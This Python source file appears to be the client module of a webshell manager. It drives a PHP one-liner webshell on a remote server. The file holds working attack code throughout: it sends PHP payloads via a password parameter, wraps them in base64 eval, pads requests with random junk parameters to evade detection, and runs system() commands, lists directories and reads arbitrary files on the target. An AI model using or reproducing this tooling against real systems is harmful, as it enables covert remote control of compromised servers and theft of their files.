import typing as t
import logging
import random
import string
import httpx
import base64
import json
from dataclasses import dataclass
from ..utils import random_english_words
from .base import Session, SessionException

logger = logging.getLogger("sessions.php")
SUBMIT_WRAPPER_PHP = """\
echo '{delimiter_start_1}'.'{delimiter_start_2}';\
try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}\
echo '{delimiter_stop}';"""


__all__ = ["PHPWebshellMixin", "PHPWebshellOneliner"]


@dataclass
class PHPWebshellOptions:
    """除了submit_raw之外的函数需要的各类选项"""

    encoder: t.Literal["raw", "base64"] = "raw"
    http_params_obfs: bool = False


@dataclass
class DirectoryEntry:
    name: str
    permission: str
    entry_type: t.Literal["directory", "file", "unknown"] = "file"


class PHPException(SessionException):
    """PHP代码在运行时产生的错误"""


class PHPWebshellMixin:
    def __init__(self, options: t.Union[None, PHPWebshellOptions]):
        self.options = options if options else PHPWebshellOptions()

    def encode(self, payload: str) -> str:
        """应用编码器"""
        if self.options.encoder == "raw":
            return payload
        elif self.options.encoder == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
            return f'eval(base64_decode("{encoded}"));'
        else:
            raise RuntimeError(f"Unsupported encoder: {self.options.encoder}")

    async def execute_cmd(self, cmd: str) -> t.Union[str, None]:
        """通过system函数执行命令"""
        return await self.submit(f"system({cmd!r});")

    async def list_dir(self, dir_path: str) -> t.Union[t.List[DirectoryEntry], None]:
        php_code = """
        error_reporting(0);
        $folderPath = DIR_PATH;
        $files = scandir($folderPath);
        $result = array();
        foreach ($files as $file) {
            $filePath = $folderPath . $file;
            array_push($result, array(
                "name" => basename($file),
                "type" => filetype($filePath),
                "permission" => decoct(fileperms($filePath))
            ));
        }
        echo json_encode($result);
        """.replace(
            "    ", ""
        ).replace(
            "DIR_PATH", repr(dir_path)
        )
        json_result = await self.submit(php_code)
        if json_result is None:
            return None
        try:
            result = json.loads(json_result)
        except json.JSONDecodeError:
            return None
        result = [
            DirectoryEntry(
                name=item["name"],
                permission=item["permission"],
                entry_type=item["type"],
            )
            for item in result
        ]
        return result

    async def get_file_contents(self, filepath: str) -> t.Union[bytes, None]:
        php_code = """
        error_reporting(0);
        $filePath = FILE_PATH;
        if(!is_file($filePath)) {
            die("WRONG_NOT_FILE");
        }
        if(!is_readable($filePath)) {
            die("WRONG_NO_PERMISSION");
        }
        $content = file_get_contents($filePath);
        echo base64_encode($content);
        """.replace("FILE_PATH", repr(filepath))
        result = await self.submit(php_code)
        if result is None:
            raise PHPException("读取失败")
        if result == "WRONG_NOT_FILE":
            raise PHPException("目标不是一个文件")
        if result == "WRONG_NO_PERMISSION":
            raise PHPException("没有权限读取这个文件")
        return base64.b64decode(result)

    async def get_pwd(self) -> t.Union[str, None]:
        """获取当前文件夹"""
        return await self.submit("echo __DIR__;")

    async def test_usablility(self) -> bool:
        """通过echo测试php webshell的可用性"""
        first_string, second_string = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        result = await self.submit(f"echo '{first_string}' . '{second_string}';")
        return result is not None and (first_string + second_string) in result

    async def submit(self, payload: str) -> t.Union[str, None]:
        """将payload通过encoder编码后提交"""
        start, stop = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        payload = SUBMIT_WRAPPER_PHP.format(
            delimiter_start_1=start[:3],
            delimiter_start_2=start[3:],
            delimiter_stop=stop,
            payload_raw=payload,
        )
        payload = self.encode(payload)
        result = await self.submit_raw(payload)
        if result is None:
            return None
        status_code, text = result
        if status_code != 200:
            logger.warning("status code error: %d", status_code)
            return None
        if "POSTEXEC_FAILED" in text:
            logger.warning("POSTEXEC_FAILED found, payload run failed")
            return None
        idx_start = text.find(start)
        if idx_start == -1:
            logger.warning("idx error: start=%d, text=%s", idx_start, repr(text))
            return None
        idx_stop_r = text[idx_start:].find(stop)
        if idx_stop_r == -1:
            logger.warning(
                "idx error: start=%d, stop_r=%d, text=%s",
                idx_start,
                idx_stop_r,
                repr(text),
            )
            return None
        idx_stop = idx_stop_r + idx_start
        return text[idx_start + len(start) : idx_stop]

    async def submit_raw(self, payload: str) -> t.Union[t.Tuple[int, str], None]:
        """提交原始php payload

        Args:
            payload (str): 需要提交的payload

        Returns:
            t.Union[t.Tuple[int, str], None]: 返回的结果，要么为状态码和响应正文，要么为None
        """
        raise NotImplementedError("这个函数应该由实际的实现override")


class PHPWebshellOneliner(PHPWebshellMixin, Session):
    """一句话的php webshell"""

    def __init__(
        self,
        method: str,
        url: str,
        password: str,
        params: t.Union[t.Dict, None] = None,
        data: t.Union[t.Dict, None] = None,
        http_params_obfs: bool = False,
        options: t.Union[PHPWebshellOptions, None] = None,
    ) -> None:
        PHPWebshellMixin.__init__(self, options)
        self.method = method.upper()
        self.url = url
        self.password = password
        self.params = {} if params is None else params
        self.data = {} if data is None else data
        self.http_params_obfs = http_params_obfs

    async def submit_raw(self, payload: str):
        params = self.params.copy()
        data = self.data.copy()
        obfs_data = {}
        if self.http_params_obfs:
            obfs_data = {
                random_english_words(): random_english_words() for _ in range(20)
            }
        if self.method in ["GET", "HEAD"]:
            params[self.password] = payload
            params.update(obfs_data)
        else:
            data[self.password] = payload
            data.update(obfs_data)
        try:
            async with httpx.AsyncClient() as client:
                response = await client.request(
                    method=self.method, url=self.url, params=params, data=data
                )
                return response.status_code, response.text

        except httpx.HTTPError:
            return None
